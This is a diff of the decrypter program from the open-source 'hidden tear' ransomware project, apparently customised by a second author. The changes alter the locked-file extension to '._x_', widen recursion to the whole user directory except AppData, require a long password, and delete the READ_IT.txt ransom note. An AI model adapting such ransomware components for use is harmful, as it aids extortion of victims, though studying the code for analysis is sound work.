@@ -1,11 +1,11 @@
-﻿/*
+/*
  _     _     _     _              _                  
 | |   (_)   | |   | |            | |                 
 | |__  _  __| | __| | ___ _ __   | |_ ___  __ _ _ __ 
 | '_ \| |/ _` |/ _` |/ _ \ '_ \  | __/ _ \/ _` | '__|
 | | | | | (_| | (_| |  __/ | | | | ||  __/ (_| | |   
 |_| |_|_|\__,_|\__,_|\___|_| |_|  \__\___|\__,_|_| 
- * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com 
+ * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com | Recoded by charlybs
  * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
  * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
  */
@@ -75,7 +75,6 @@ namespace hidden_tear_decrypter
                     }
                     decryptedBytes = ms.ToArray();
                         
-                  
                 }
             }
 
@@ -100,26 +99,29 @@ namespace hidden_tear_decrypter
             catch (Exception exception) {
             }
             
-
         }
 
         public void DecryptDirectory(string location)
         {
+            
             string password = textBox1.Text;
 
             string[] files = Directory.GetFiles(location);
             string[] childDirectories = Directory.GetDirectories(location);
-            for (int i = 0; i < files.Length; i++)
+            if (!location.Contains("\\AppData\\"))
             {
-                string extension = Path.GetExtension(files[i]);
-                if (extension == ".locked")
+                for (int i = 0; i < files.Length; i++)
                 {
-                    DecryptFile(files[i], password);
+                    string extension = Path.GetExtension(files[i]);
+                    if (extension == "._x_")
+                    {
+                        DecryptFile(files[i], password);
+                    }
                 }
-            }
-            for (int i = 0; i < childDirectories.Length; i++)
-            {
-                DecryptDirectory(childDirectories[i]);
+                for (int i = 0; i < childDirectories.Length; i++)
+                {
+                    DecryptDirectory(childDirectories[i]);
+                }
             }
 
             if (oneFileDecrypted) {
@@ -134,14 +136,17 @@ namespace hidden_tear_decrypter
             
             
         }
-
+        
         private void button1_Click(object sender, EventArgs e)
         {
-            if (textBox1.Text != "" && textBox1.Text != "Write the password here!")
+            string passwordTextBox = textBox1.Text;
+            
+            if (passwordTextBox != "" && passwordTextBox != "Write the password here!" && passwordTextBox.Length>30)
             {
-                string path = "\\Desktop";
+                string path = "\\";
                 string fullpath = userDir + userName + path;
                 DecryptDirectory(fullpath);
+                System.IO.File.Delete(@fullpath+"\\Desktop\\READ_IT.txt");
             }
             else {
                 textBox1.Text = "Write the password here!";
@@ -153,6 +158,6 @@ namespace hidden_tear_decrypter
         {
 
         }
-
+        
     }
 }
